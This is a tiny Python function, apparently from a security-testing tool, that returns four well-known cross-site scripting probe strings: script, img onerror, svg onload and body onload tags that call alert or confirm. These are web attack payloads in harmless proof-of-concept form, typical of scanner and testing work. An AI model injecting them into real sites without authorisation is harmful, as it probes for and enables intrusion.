def get_advanced_xss_payloads():
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=confirm('XSS')>"
    ]
